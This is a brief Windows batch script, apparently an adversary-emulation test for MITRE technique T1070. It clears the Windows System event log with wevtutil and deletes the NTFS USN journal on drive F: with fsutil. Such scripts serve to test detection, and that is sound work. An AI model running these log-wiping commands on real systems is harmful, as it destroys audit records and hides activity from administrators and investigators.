@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Indicator Removal on Host (T1070)
ECHO.
ECHO [+] Removing Windows Events
ECHO -------------------------------------------------------------------
cmd.exe /c wevtutil cl System
ECHO.


ECHO [+] Using 'FSUTIL.EXE' to alter Filesystem 
ECHO -------------------------------------------------------------------
fsutil usn deletejournal /D F:
ECHO.
